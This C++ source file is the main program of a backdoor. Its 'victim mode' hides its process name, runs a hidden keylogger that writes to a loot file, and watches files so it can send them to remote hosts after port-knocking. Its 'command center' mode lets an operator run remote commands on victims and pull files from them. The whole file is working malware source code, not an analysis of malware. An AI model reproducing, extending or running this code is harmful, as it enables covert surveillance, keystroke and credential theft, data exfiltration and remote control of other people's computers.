#include "main.h"

#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#include "Crypto.h"
#include "FileMonitor.h"
#include "NetworkEngine.h"
#include "RemoteCodeExecuter.h"
#include "TcpStack.h"
#include "UdpStack.h"
#include "authenticator.h"

#include "Keylogger.h"

int main(int argc, char *argv[]) {
    Properties p = getConfig("backdoor.conf");

    if (argc != 2) {
        printUsage(argv[0]);
        return 0;
    }

    std::string option(argv[1]);

    if (option == "client") {
        return clientMode(p, argv[0]);
    } else if (option == "server") {
        return serverMode(p);
    } else {
        printUsage(argv[0]);
    }

    return 0;
}

/*
 * Prints the help menu of the program.
 *
 * Params:
 *      const char *name: The name of the application, argv[0].
 */
void printUsage(const char *name) {
    std::cout << "Usage: " << name << " [client|server|test]" << std::endl;
    std::cout << "\tclient - client mode a.k.a victim mode" << std::endl;
    std::cout << "\tserver - server mode a.k.a command center mode" << std::endl;
}

/*
 * Opens and parses the configuration file for and stores the key value pairs in a hash map.
 *
 * Params:
 *      const std::string &filename: The relative path of the configuration file.
 *
 * Returns:
 *      The hash map containing all the successfully parsed key value pairs of the configuration
 *      file.
 */
Properties getConfig(const std::string &filename) {
    std::ifstream file(filename);
    std::string line;
    Properties properties;

    if (file.is_open()) {
        while (std::getline(file, line)) {
            std::istringstream is_line(line);
            std::string key;

            if (std::getline(is_line, key, '=')) {
                std::string value;

                if (key[0] == '#') {
                    continue;
                }

                if (std::getline(is_line, value)) {
                    properties[key] = value;
                }
            }
        }
    }

    return properties;
}

/*
 * Changes the name of the process to the mask.
 *
 * Params:
 *      char *original: argv[0]
 *
 *      const char *mask: The new name use.
 *
 * Returns:
 *      0 if the process name was masked, -1 otherwise.
 */
int maskProcess(char *original, const char *mask) {
    const int MAX_PROCESS_LEN = 16;
    strncpy(original, mask, MAX_PROCESS_LEN);
    original[MAX_PROCESS_LEN] = 0;
    if (prctl(PR_SET_NAME, mask, 0, 0) == -1) {
        perror("prctl");
        return -1;
    }
    return 0;
}

/*
 * The main entry point for client mode or "victim mode".
 *
 * Params:
 *      const Properties &p: The list of configuration properties.
 *
 *      char *programName: argv[0].
 *
 * Return:
 *      The exit code for the application.
 */
int clientMode(const Properties &p, char *programName) {

    /*
    // we can use orphans to do our dirty work
    if (fork()) {
        return 0;
    }
    */

    maskProcess(programName, p.at("newProcessName").c_str());

    // Start the keylogger in another thread and detach
    std::thread kl_thread([p] {
        Keylogger kl(p.at("keylogLootFile"));
        kl.start_logging();
    });
    kl_thread.detach();

    // get all the settings
    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    // create network engine
    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);

    // create file monitor
    EventCallback unusedFunction = [&](FileMonitor *fm, struct inotify_event *e) {};
    EventCallback exfiltrateFile = [&](FileMonitor *fm, struct inotify_event *e) {
        std::set<unsigned int> hosts = fm->getDestinations(e->wd);

        for (auto host : hosts) {
            for (auto fullPath : fm->getFullPathsForHost(host, e->wd)) {
                if (fork() == 0) {
                    UCharVector buffer = fileToBuffer(fullPath);
                    UCharVector ciphertext = netEngine.getCrypto()->enc(buffer);
                    struct in_addr daddr;
                    daddr.s_addr = host;
                    netEngine.knockAndSend(daddr, buffer);
                    exit(0);
                }
            }
        }
    };
    FileMonitor fm(exfiltrateFile, exfiltrateFile, unusedFunction);

    // adding all the required callback functions
    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
    netEngine.LoopCallbacks.push_back(
        [&](const pcap_pkthdr *header, const unsigned char *packet, NetworkEngine *net) -> void {
            fm.netCallback(header, packet, net);
        });

    fm.startMonitoring();
    netEngine.startSyncSniff("ip");

    return 0;
}

/*
 * The main entry point for server mode or "command center".
 *
 * Params:
 *      const Properties &p: The list of configuration properties.
 *
 * Return:
 *      The exit code for the application.
 */
int serverMode(const Properties &p) {
    bool running;
    std::string line;
    std::vector<std::string> tokens;

    struct in_addr daddr;

    // get all the settings
    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);

    // adding all the required callback functions
    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);

    netEngine.startAsyncSniff("ip");

    running = true;
    while (running) {
        std::cout << "server: ";

        if (!std::getline(std::cin, line)) {
            continue;
        }

        tokens = tokenizeString(line);

        // format: quit
        if (tokens[0] == "quit") {
            running = false;
        }

        // format: exec [ip] [command]
        if (tokens[0] == "exec") {
            // check argument count
            if (tokens.size() < 2) {
                std::cerr << "server: Not enough arguments" << std::endl;
                break;
            }

            // convert and check ip
            if (!NetworkEngine::dottedDecimalToBinary(tokens[1], &daddr)) {
                std::cerr << "server: Invalid destination host" << std::endl;
                break;
            }

            // run command
            RemoteCodeExecuter::sendCommand(&netEngine, daddr, line.substr(line.find(tokens[2])));

            // delay for nice output
            sleep(1);
        }

        // format: get [ip] [file]
        if (tokens[0] == "get") {
            if (tokens.size() < 2) {
                std::cerr << "server: Not enough arguments" << std::endl;
                break;
            }

            // convert and check ip
            if (!NetworkEngine::dottedDecimalToBinary(tokens[1], &daddr)) {
                std::cerr << "server: Invalid destination host" << std::endl;
                break;
            }

            // send get command
            FileMonitor::sendRequest(tokens[2], daddr, &netEngine);

            // TODO: start tcp server
        }
    }

    std::cout << "Quitting..." << std::endl;
    return 0;
}
